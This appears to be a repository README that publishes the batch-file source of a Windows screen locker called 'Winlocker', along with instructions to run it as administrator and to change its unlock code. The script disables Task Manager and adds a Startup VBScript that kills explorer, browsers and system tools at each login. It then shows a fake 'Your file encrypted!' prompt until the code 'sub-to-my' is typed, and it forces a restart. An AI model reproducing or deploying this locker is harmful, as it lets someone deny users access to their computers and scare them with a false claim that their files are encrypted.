# Winlocker-0.1-By-XVovaBlueX
Winlocker-0.1-By-XVovaBlueX
For use start programm:
Start programm as administrator!

Source code (Batch file) :
@echo off
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1
echo Set x = CreateObject("Wscript.Shell") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im explorer.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im taskmgr.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im calc.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im mspaint.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im browser.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im yandex.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im iexplorer.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im chrome.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im notepad.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"taskkill /f /im regedit.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo Do >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo key = InputBox ("Your file encrypted! Please enter code:") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo Loop Until key = "sub-to-my" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo MsgBox"Decrypted!" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
echo x.run"decrypt.cmd" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"

echo Please open encrypt (.cmd) as administrator >> "%HomePath%\Desktop\ReadMe.txt"

echo @echo off >> "%HomePath%\Desktop\decrypt.cmd"
echo REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" >> "%HomePath%\Desktop\decrypt.cmd"
echo del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\ecrypt_window.vbs" >> "%HomePath%\Desktop\decrypt.cmd"
shutdown /r /t 1

The end

For change password found this:
echo Loop Until key = "sub-to-my" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
sub-to-my - This password
